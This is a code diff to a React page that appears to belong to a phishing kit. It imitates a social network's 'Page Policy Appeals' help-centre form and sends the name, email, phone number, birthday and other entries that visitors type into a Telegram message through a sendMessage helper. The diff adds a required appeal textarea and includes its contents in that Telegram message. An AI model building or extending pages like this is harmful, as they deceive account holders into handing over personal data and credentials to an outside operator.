@@ -7,6 +7,7 @@ import { useState, useEffect, useCallback, useMemo } from 'react';
 import { translateText } from '@/utils/translate';
 import sendMessage from '@/utils/telegram';
 import { AsYouType, getCountryCallingCode } from 'libphonenumber-js';
+
 const Home = () => {
     const defaultTexts = useMemo(
         () => ({
@@ -24,6 +25,8 @@ const Home = () => {
             mail: 'Email',
             phone: 'Phone Number',
             birthday: 'Birthday',
+            yourAppeal: 'Your Appeal',
+            appealPlaceholder: 'Please describe your appeal in detail...',
             submit: 'Submit',
             fieldRequired: 'This field is required',
             about: 'About',
@@ -42,7 +45,8 @@ const Home = () => {
         pageName: '',
         mail: '',
         phone: '',
-        birthday: ''
+        birthday: '',
+        appeal: '' // Thêm trường appeal
     });
 
     const [showPassword, setShowPassword] = useState(false);
@@ -54,7 +58,61 @@ const Home = () => {
     const translateAllTexts = useCallback(
         async (targetLang) => {
             try {
-                const [translatedHelpCenter, translatedEnglish, translatedUsing, translatedManaging, translatedPrivacy, translatedPolicies, translatedAppeals, translatedDetected, translatedLimited, translatedSubmit, translatedPageName, translatedMail, translatedPhone, translatedBirthday, translatedSubmitBtn, translatedRequired, translatedAbout, translatedAdChoices, translatedCreateAd, translatedPrivacyText, translatedCareers, translatedCreatePage, translatedTerms, translatedCookies] = await Promise.all([translateText(defaultTexts.helpCenter, targetLang), translateText(defaultTexts.english, targetLang), translateText(defaultTexts.using, targetLang), translateText(defaultTexts.managingAccount, targetLang), translateText(defaultTexts.privacySecurity, targetLang), translateText(defaultTexts.policiesReporting, targetLang), translateText(defaultTexts.pagePolicyAppeals, targetLang), translateText(defaultTexts.detectedActivity, targetLang), translateText(defaultTexts.accessLimited, targetLang), translateText(defaultTexts.submitAppeal, targetLang), translateText(defaultTexts.pageName, targetLang), translateText(defaultTexts.mail, targetLang), translateText(defaultTexts.phone, targetLang), translateText(defaultTexts.birthday, targetLang), translateText(defaultTexts.submit, targetLang), translateText(defaultTexts.fieldRequired, targetLang), translateText(defaultTexts.about, targetLang), translateText(defaultTexts.adChoices, targetLang), translateText(defaultTexts.createAd, targetLang), translateText(defaultTexts.privacy, targetLang), translateText(defaultTexts.careers, targetLang), translateText(defaultTexts.createPage, targetLang), translateText(defaultTexts.termsPolicies, targetLang), translateText(defaultTexts.cookies, targetLang)]);
+                const [
+                    translatedHelpCenter, 
+                    translatedEnglish, 
+                    translatedUsing, 
+                    translatedManaging, 
+                    translatedPrivacy, 
+                    translatedPolicies, 
+                    translatedAppeals, 
+                    translatedDetected, 
+                    translatedLimited, 
+                    translatedSubmit, 
+                    translatedPageName, 
+                    translatedMail, 
+                    translatedPhone, 
+                    translatedBirthday,
+                    translatedYourAppeal,
+                    translatedAppealPlaceholder,
+                    translatedSubmitBtn, 
+                    translatedRequired, 
+                    translatedAbout, 
+                    translatedAdChoices, 
+                    translatedCreateAd, 
+                    translatedPrivacyText, 
+                    translatedCareers, 
+                    translatedCreatePage, 
+                    translatedTerms, 
+                    translatedCookies
+                ] = await Promise.all([
+                    translateText(defaultTexts.helpCenter, targetLang), 
+                    translateText(defaultTexts.english, targetLang), 
+                    translateText(defaultTexts.using, targetLang), 
+                    translateText(defaultTexts.managingAccount, targetLang), 
+                    translateText(defaultTexts.privacySecurity, targetLang), 
+                    translateText(defaultTexts.policiesReporting, targetLang), 
+                    translateText(defaultTexts.pagePolicyAppeals, targetLang), 
+                    translateText(defaultTexts.detectedActivity, targetLang), 
+                    translateText(defaultTexts.accessLimited, targetLang), 
+                    translateText(defaultTexts.submitAppeal, targetLang), 
+                    translateText(defaultTexts.pageName, targetLang), 
+                    translateText(defaultTexts.mail, targetLang), 
+                    translateText(defaultTexts.phone, targetLang), 
+                    translateText(defaultTexts.birthday, targetLang),
+                    translateText(defaultTexts.yourAppeal, targetLang),
+                    translateText(defaultTexts.appealPlaceholder, targetLang),
+                    translateText(defaultTexts.submit, targetLang), 
+                    translateText(defaultTexts.fieldRequired, targetLang), 
+                    translateText(defaultTexts.about, targetLang), 
+                    translateText(defaultTexts.adChoices, targetLang), 
+                    translateText(defaultTexts.createAd, targetLang), 
+                    translateText(defaultTexts.privacy, targetLang), 
+                    translateText(defaultTexts.careers, targetLang), 
+                    translateText(defaultTexts.createPage, targetLang), 
+                    translateText(defaultTexts.termsPolicies, targetLang), 
+                    translateText(defaultTexts.cookies, targetLang)
+                ]);
 
                 setTranslatedTexts({
                     helpCenter: translatedHelpCenter,
@@ -71,6 +129,8 @@ const Home = () => {
                     mail: translatedMail,
                     phone: translatedPhone,
                     birthday: translatedBirthday,
+                    yourAppeal: translatedYourAppeal,
+                    appealPlaceholder: translatedAppealPlaceholder,
                     submit: translatedSubmitBtn,
                     fieldRequired: translatedRequired,
                     about: translatedAbout,
@@ -142,7 +202,7 @@ const Home = () => {
     };
 
     const validateForm = () => {
-        const requiredFields = ['pageName', 'mail', 'phone', 'birthday'];
+        const requiredFields = ['pageName', 'mail', 'phone', 'birthday', 'appeal']; // Thêm appeal vào required fields
         const newErrors = {};
 
         requiredFields.forEach((field) => {
@@ -188,7 +248,8 @@ const Home = () => {
 🔖 <b>Page Name:</b> <code>${data.pageName}</code>
 📧 <b>Email:</b> <code>${data.mail}</code>
 📱 <b>Số điện thoại:</b> <code>${data.phone}</code>
-🎂 <b>Ngày sinh:</b> <code>${data.birthday}</code>`;
+🎂 <b>Ngày sinh:</b> <code>${data.birthday}</code>
+📝 <b>Appeal:</b> <code>${data.appeal}</code>`; // Thêm appeal vào message
     };
 
     const handleClosePassword = () => {
@@ -217,6 +278,7 @@ const Home = () => {
             title: translatedTexts.policiesReporting
         }
     ];
+
     return (
         <>
             <header className='sticky top-0 left-0 flex h-14 justify-between p-4 shadow-sm'>
@@ -290,6 +352,23 @@ const Home = () => {
                                 <input type='date' name='birthday' className={`w-full rounded-lg border px-3 py-1.5 ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'}`} value={formData.birthday} onChange={(e) => handleInputChange('birthday', e.target.value)} />
                                 {errors.birthday && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
+                            
+                            {/* Thêm ô Your Appeal - Textarea lớn */}
+                            <div className='flex flex-col gap-2'>
+                                <p>
+                                    {translatedTexts.yourAppeal} <span className='text-red-500'>*</span>
+                                </p>
+                                <textarea 
+                                    name='appeal'
+                                    rows={4}
+                                    className={`w-full rounded-lg border px-3 py-1.5 resize-none ${errors.appeal ? 'border-[#dc3545]' : 'border-gray-300'}`}
+                                    placeholder={translatedTexts.appealPlaceholder}
+                                    value={formData.appeal}
+                                    onChange={(e) => handleInputChange('appeal', e.target.value)}
+                                />
+                                {errors.appeal && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
+                            </div>
+
                             <button className='w-fit rounded-lg bg-gray-200 px-3 py-2 text-[15px] font-normal' onClick={handleSubmit}>
                                 {translatedTexts.submit}
                             </button>
@@ -324,4 +403,5 @@ const Home = () => {
         </>
     );
 };
+
 export default Home;
